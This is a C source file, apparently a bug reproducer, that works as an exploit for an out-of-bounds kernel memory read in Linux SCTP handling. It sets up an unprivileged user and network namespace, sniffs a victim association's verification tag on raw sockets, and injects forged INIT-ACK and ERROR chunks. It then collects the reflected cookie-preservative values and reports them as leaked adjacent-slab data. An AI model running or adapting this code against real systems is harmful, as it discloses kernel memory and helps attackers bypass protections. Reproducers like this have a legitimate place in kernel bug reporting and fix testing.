// gcc -O2 -static -o repro repro.c
#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sched.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <net/if.h>
#include <linux/filter.h>
#include <stdint.h>

static uint32_t crc32c_table[256];
static void crc32c_init(void) {
    for (uint32_t i = 0; i < 256; i++) {
        uint32_t c = i;
        for (int k = 0; k < 8; k++)
            c = (c & 1) ? (0x82F63B78u ^ (c >> 1)) : (c >> 1);
        crc32c_table[i] = c;
    }
}
static uint32_t crc32c(const uint8_t *p, size_t len) {
    uint32_t c = ~0u;
    for (size_t i = 0; i < len; i++)
        c = crc32c_table[(c ^ p[i]) & 0xff] ^ (c >> 8);
    return c ^ ~0u;
}

struct sctphdr { uint16_t src; uint16_t dst; uint32_t vtag; uint32_t checksum; } __attribute__((packed));
struct chunkhdr { uint8_t type; uint8_t flags; uint16_t length; } __attribute__((packed));

#define VPORT 20000
#define FPORT 20001

static int rawfd;
static struct sockaddr_in vaddr;

static uint16_t ipcsum(const void *p, int len) {
    const uint16_t *w = p; uint32_t s = 0;
    while (len > 1) { s += *w++; len -= 2; }
    if (len) s += *(const uint8_t *)w;
    s = (s >> 16) + (s & 0xffff); s += (s >> 16);
    return (uint16_t)~s;
}

static void raw_send_pp(uint8_t *sctp, size_t len, uint16_t sport, uint16_t dport) {
    struct sctphdr *h = (struct sctphdr *)sctp;
    h->src = htons(sport);
    h->dst = htons(dport);
    h->checksum = 0;
    h->checksum = crc32c(sctp, len);

    uint8_t frame[1500];
    struct iphdr { uint8_t ihl_v, tos; uint16_t tot; uint16_t id, frag;
                   uint8_t ttl, proto; uint16_t check; uint32_t s, d; } *ip
        = (void *)frame;
    ip->ihl_v = 0x45; ip->tos = 0;
    ip->tot = htons(20 + len);
    ip->id = htons(0x4242); ip->frag = 0;
    ip->ttl = 64; ip->proto = IPPROTO_SCTP; ip->check = 0;
    ip->s = htonl(INADDR_LOOPBACK);
    ip->d = htonl(INADDR_LOOPBACK);
    ip->check = ipcsum(ip, 20);
    memcpy(frame + 20, sctp, len);
    if (sendto(rawfd, frame, 20 + len, 0,
               (struct sockaddr *)&vaddr, sizeof(vaddr)) < 0)
        perror("sendto");
}

static void raw_send(uint8_t *sctp, size_t len) {
    raw_send_pp(sctp, len, FPORT, VPORT);
}

static void up_loopback(void) {
    int s = socket(AF_INET, SOCK_DGRAM, 0);
    struct ifreq ifr;
    memset(&ifr, 0, sizeof(ifr));
    strcpy(ifr.ifr_name, "lo");
    ioctl(s, SIOCGIFFLAGS, &ifr);
    ifr.ifr_flags |= IFF_UP | IFF_RUNNING;
    if (ioctl(s, SIOCSIFFLAGS, &ifr) < 0) perror("SIOCSIFFLAGS lo");
    close(s);
}

static void write_file(const char *p, const char *s) {
    int fd = open(p, O_WRONLY);
    if (fd < 0) return;
    write(fd, s, strlen(s));
    close(fd);
}

static void attach_drop_all(int fd) {
    struct sock_filter code[] = {
        BPF_STMT(BPF_RET + BPF_K, 0),
    };
    struct sock_fprog prog = { .len = 1, .filter = code };
    if (setsockopt(fd, SOL_SOCKET, SO_ATTACH_FILTER, &prog, sizeof(prog)) < 0)
        perror("SO_ATTACH_FILTER");
}

static void send_init_ack(uint32_t victim_vtag) {
    uint8_t pkt[256];
    memset(pkt, 0, sizeof(pkt));
    struct sctphdr *sh = (struct sctphdr *)pkt;
    sh->vtag = victim_vtag;
    struct chunkhdr *ch = (struct chunkhdr *)(pkt + sizeof(*sh));
    ch->type = 2;
    uint8_t *p = (uint8_t *)ch + sizeof(*ch);
    *(uint32_t *)(p + 0)  = htonl(0x11223344);
    *(uint32_t *)(p + 4)  = htonl(0x20000);
    *(uint16_t *)(p + 8)  = htons(10);
    *(uint16_t *)(p + 10) = htons(10);
    *(uint32_t *)(p + 12) = htonl(0x1000);
    uint8_t *param = p + 16;
    *(uint16_t *)(param + 0) = htons(7);
    *(uint16_t *)(param + 2) = htons(4 + 8);
    memset(param + 4, 0x41, 8);
    int body = 16 + 12;
    ch->length = htons(sizeof(*ch) + body);
    size_t total = sizeof(*sh) + sizeof(*ch) + body;
    while (total % 4) pkt[total++] = 0;
    raw_send(pkt, total);
}

int main(void) {
    crc32c_init();

    uid_t uid = getuid(); gid_t gid = getgid();
    if (unshare(CLONE_NEWUSER | CLONE_NEWNET) < 0) { perror("unshare"); return 1; }
    char buf[64];
    write_file("/proc/self/setgroups", "deny");
    snprintf(buf, sizeof(buf), "0 %d 1", uid); write_file("/proc/self/uid_map", buf);
    snprintf(buf, sizeof(buf), "0 %d 1", gid); write_file("/proc/self/gid_map", buf);

    up_loopback();

    int srv = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
    if (srv < 0) { perror("srv socket"); return 1; }
    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa));
    sa.sin_family = AF_INET;
    sa.sin_port = htons(FPORT);
    sa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(srv, (struct sockaddr *)&sa, sizeof(sa)) < 0) perror("bind srv");
    attach_drop_all(srv);
    if (listen(srv, 16) < 0) perror("listen");

    rawfd = socket(AF_INET, SOCK_RAW, IPPROTO_SCTP);
    if (rawfd < 0) { perror("raw socket"); return 1; }
    int one = 1;
    setsockopt(rawfd, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one));
    int rcvbuf = 8 << 20;
    setsockopt(rawfd, SOL_SOCKET, SO_RCVBUF, &rcvbuf, sizeof(rcvbuf));

    memset(&vaddr, 0, sizeof(vaddr));
    vaddr.sin_family = AF_INET;
    vaddr.sin_addr.s_addr = htonl(INADDR_LOOPBACK);

    int vfd = socket(AF_INET, SOCK_STREAM, IPPROTO_SCTP);
    struct sockaddr_in la;
    memset(&la, 0, sizeof(la));
    la.sin_family = AF_INET;
    la.sin_port = htons(VPORT);
    la.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    if (bind(vfd, (struct sockaddr *)&la, sizeof(la)) < 0) perror("bind victim");
    fcntl(vfd, F_SETFL, O_NONBLOCK);
    struct sockaddr_in pa;
    memset(&pa, 0, sizeof(pa));
    pa.sin_family = AF_INET;
    pa.sin_port = htons(FPORT);
    pa.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    connect(vfd, (struct sockaddr *)&pa, sizeof(pa));

    uint32_t victim_vtag = 0;
    uint8_t rb[2048];
    for (int tries = 0; tries < 500 && !victim_vtag; tries++) {
        ssize_t n = recv(rawfd, rb, sizeof(rb), MSG_DONTWAIT);
        if (n < 0) { usleep(1000); continue; }
        int ihl = (rb[0] & 0x0f) * 4;
        if (n < ihl + (int)sizeof(struct sctphdr) + 8) continue;
        uint8_t *sctp = rb + ihl;
        struct sctphdr *sh = (struct sctphdr *)sctp;
        if (ntohs(sh->dst) != FPORT) continue;
        struct chunkhdr *ch = (struct chunkhdr *)(sctp + sizeof(*sh));
        if (ch->type == 1 ) {
            victim_vtag = *(uint32_t *)((uint8_t *)ch + sizeof(*ch));
            break;
        }
    }
    fprintf(stderr, "victim vtag = 0x%08x\n", ntohl(victim_vtag));

    uint8_t e[64];
    memset(e, 0, sizeof(e));
    {
        struct sctphdr *esh = (struct sctphdr *)e;
        esh->vtag = victim_vtag;
        struct chunkhdr *ech = (struct chunkhdr *)(e + sizeof(*esh));
        ech->type = 9;
        ech->length = htons(8);
        uint8_t *err = (uint8_t *)ech + sizeof(*ech);
        *(uint16_t *)(err + 0) = htons(3);
        *(uint16_t *)(err + 2) = htons(4);
    }
    size_t elen = sizeof(struct sctphdr) + 8;

    uint8_t marker[64];
    memset(marker, 0x41, sizeof(marker));
    { struct sctphdr *m = (struct sctphdr *)marker; m->vtag = victim_vtag; }
    size_t mlen = 48;

    unsigned int leaks = 0, nonzero = 0;
    for (int rep = 0; rep < 40; rep++) {
        send_init_ack(victim_vtag);
        usleep(2000);

        for (int s = 0; s < 1500; s++) raw_send_pp(marker, mlen, VPORT, FPORT);
        usleep(20000);

        while (recv(rawfd, rb, sizeof(rb), MSG_DONTWAIT) > 0) {}
        raw_send(e, elen);
        usleep(8000);
        ssize_t n;
        while ((n = recv(rawfd, rb, sizeof(rb), MSG_DONTWAIT)) > 0) {
            int ihl = (rb[0] & 0x0f) * 4;
            if (n < ihl + (int)sizeof(struct sctphdr) + 4) continue;
            uint8_t *sctp = rb + ihl;
            struct sctphdr *rsh = (struct sctphdr *)sctp;
            if (ntohs(rsh->dst) != FPORT) continue;
            struct chunkhdr *rch = (struct chunkhdr *)(sctp + sizeof(*rsh));
            if (rch->type != 1 ) continue;
            uint8_t *q = (uint8_t *)rch + sizeof(*rch) + 16;
            uint8_t *cend = (uint8_t *)rch + ntohs(rch->length);
            while (q + 4 <= cend) {
                uint16_t ptype = ntohs(*(uint16_t *)q);
                uint16_t plen = ntohs(*(uint16_t *)(q + 2));
                if (plen < 4) break;
                if (ptype == 9  && plen >= 8) {
                    uint32_t reflected = ntohl(*(uint32_t *)(q + 4));
                    leaks++;
                    if (reflected != 0) {

                        uint64_t lo = (uint64_t)reflected * 500;
                        nonzero++;
                        fprintf(stderr,
                            "LEAK rep=%d: lifespan_increment=0x%08x => OOB-read "
                            "u32 of adjacent slab in [0x%08llx , 0x%08llx]\n",
                            rep, reflected,
                            (unsigned long long)lo,
                            (unsigned long long)(lo + 499));
                    }
                }
                q += (plen + 3) & ~3u;
            }
        }
    }

    fprintf(stderr, "done; total leaks=%u nonzero(adjacent-slab)=%u\n",
            leaks, nonzero);
    usleep(100000);
    return 0;
}
